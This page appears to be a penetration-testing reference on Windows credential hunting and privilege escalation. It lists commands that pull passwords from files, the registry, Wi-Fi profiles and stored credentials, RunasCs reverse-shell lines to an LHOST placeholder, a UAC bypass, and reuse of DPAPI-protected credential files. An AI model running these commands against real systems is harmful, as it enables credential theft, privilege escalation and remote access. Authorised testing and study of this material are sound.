# Windows credential checks

[← Windows quick reference](../04-windows-privesc.md)

## Credential hunting
```powershell
# Files
findstr /si password *.txt *.ini *.config *.xml
type C:\Windows\Panther\Unattend.xml ; type C:\Windows\system32\sysprep\*.xml
# Registry
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword  # autologon creds
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"     # saved proxy/host
# Stored / Wi-Fi / browser
cmdkey /list ; netsh wlan show profile name=X key=clear
```

For SAM, LSA, LSASS, and cached material, follow [Windows credential access](credential-access.md).

## Run as another user with credentials

Plain `runas` works from a command prompt, but prompts for a password and requires the Secondary Logon service. A service/reverse-shell context can make password entry, desktop access, or child-process output awkward. RunasCs supports an explicit password and redirected I/O; inspect the resulting local token and network identity. [Microsoft runas](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)), [RunasCs author documentation](https://github.com/antonioCoco/RunasCs).

```powershell
.\RunasCs.exe <user> <pass> "cmd /c whoami"
.\RunasCs.exe <user> <pass> cmd.exe -r LHOST:443              # reverse shell AS <user>
.\RunasCs.exe <user> <pass> cmd.exe -d corp.example -r LHOST:443   # domain account
.\RunasCs.exe <user> <pass> cmd.exe --bypass-uac -r LHOST:443    # if <user> is a local admin
# PowerShell-only host (nothing on disk):
Invoke-RunasCs <user> <pass> "cmd /c whoami" -Domain corp.example
```
Alternate data streams: `dir /R`, `more < file:stream`, `type ... > file:hidden`.
- **Runas with saved creds:** `runas /savecred /user:admin C:\rev.exe`.
- UAC bypass only if you're admin-but-not-elevated (fodhelper, etc.).

Logon type 9 (`NewCredentials`, similar to `runas /netonly`) supplies outbound credentials while retaining the local identity; local `whoami` alone does not test those credentials. Verify a fitting remote resource and its authenticated principal. Other logon types have different account/logon-policy and UAC behavior. [Microsoft logon types](https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types).

## Existing CLIXML and DPAPI material

On Windows, PowerShell credential exports normally use DPAPI tied to the exporting user and computer. An existing credential file can be usable from that same context:

```powershell
$Stored = Import-Clixml -LiteralPath 'C:\Path\To\existing-credential.xml'
if ($Stored -is [pscredential]) {
    $Stored.UserName
    # Supply $Stored to a supported -Credential parameter for a known relevant service.
}
```

Finding the file does not establish decryption access from a different account or host. Saved browser/vault/credential files likewise need the appropriate DPAPI masterkey/context and may have additional protections. Identify user versus machine scope before selecting a parser; use [SharpDPAPI's prerequisite documentation](https://github.com/GhostPack/SharpDPAPI) for deeper workflows. [Import-Clixml credential behavior](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml).
